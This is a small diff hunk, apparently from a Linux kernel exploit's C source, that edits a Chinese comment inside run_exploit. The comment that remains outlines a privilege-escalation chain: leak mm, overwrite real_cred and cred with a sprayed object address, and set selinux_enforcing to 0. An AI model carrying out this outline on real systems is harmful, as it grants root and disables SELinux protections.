@@ -296,7 +296,7 @@ int run_exploit(int argc, char **argv) {
   pin_to_core(CORE);
 
   /*
-   * Cred 直写路线 (参考 dijun 成功案例):
+   * Cred 直写路线:
    *   mm leaked → walk#1 写 real_cred = <spray node addr>
    *            → walk#2 写 cred     = <spray node addr>
    *            → walk#3 写 selinux_enforcing = 0
